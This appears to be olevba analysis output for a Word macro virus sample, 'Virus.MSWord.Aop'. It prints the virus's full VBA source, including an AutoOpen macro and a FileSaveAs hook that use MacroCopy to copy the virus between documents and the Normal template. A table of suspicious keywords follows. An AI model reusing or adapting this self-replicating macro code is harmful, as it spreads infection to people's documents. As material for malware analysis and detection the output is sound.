olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aop
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aop - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Aop - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "?eàá?òà?ò ?eè ?à?è?è ?àé?à íà ?è?ê"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg

WordBasic.ToolsMacro Name:="FSaveAs", Edit:=1, Description:="佯噌铗噱?镳?玎镨耔 羿殡?磬 滂耜", Show:=1
WordBasic.EndOfDocument
WordBasic.Insert Chr(13) + Chr(13) + "Sub FSAs(VFileName$)"
WordBasic.Insert Chr(13) + "MsgBox VFileName$"
WordBasic.Insert Chr(13) + "FileSaveAs .Name = VFileName$, .Format = 1"
WordBasic.Insert Chr(13) + "MacroCopy " + Chr(34) + "Normal:FileSaveAs" + Chr(34) + ", VFileName$ +" + Chr(34) + ":FileSaveAs" + Chr(34)
WordBasic.Insert Chr(13) + "MacroCopy " + Chr(34) + "Normal:AutoOpen" + Chr(34) + ", VFileName$ + " + Chr(34) + ":AutoOpen" + Chr(34)
WordBasic.Insert Chr(13) + "MacroCopy " + Chr(34) + "Normal:MVG" + Chr(34) + ", VFileName$ +" + Chr(34) + ":MVG" + Chr(34)
WordBasic.Insert Chr(13) + "End sub"
WordBasic.FileClose 1
WordBasic.Call "FSaveAs.FSAs", WordBasic.[FileName$]()
WordBasic.ToolsMacro Name:="FSaveAs", Delete:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Aop - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.ToolsMacro Name:="AOpen", Edit:=1, Description:="佯噌铗噱?镳?铗牮�蜩� 羿殡"
WordBasic.EndOfDocument
WordBasic.Insert Chr(13) + Chr(13) + "Sub AOp(VFileName$)"
WordBasic.Insert Chr(13) + "MsgBox VFileName$"
WordBasic.Insert Chr(13) + "MacroCopy VFileName$+" + Chr(34) + ":FileSaveAs" + Chr(34) + ", " + Chr(34) + "Normal:FileSaveAs" + Chr(34)
WordBasic.Insert Chr(13) + "MacroCopy VFileName$ + " + Chr(34) + ":AutoOpen" + Chr(34) + ", " + Chr(34) + "Normal:AutoOpen" + Chr(34)
WordBasic.Insert Chr(13) + "MacroCopy VFileName$ + " + Chr(34) + ":MVG" + Chr(34) + ", " + Chr(34) + "Normal:MVG" + Chr(34)
WordBasic.Insert Chr(13) + "End sub"
WordBasic.FileClose 1
WordBasic.Call "AOpen.AOp", WordBasic.[FileName$]()
WordBasic.ToolsMacro Name:="AOpen", Delete:=1

End Sub
-------------------------------------------------------------------------------
VBA MACRO MVG.bas 
in file: Virus.MSWord.Aop - OLE stream: 'Macros/VBA/MVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ì?òêà aèeó?à"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MVG.MAIN"

Rem     --------(c)Macro Virus Generator    -----------
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

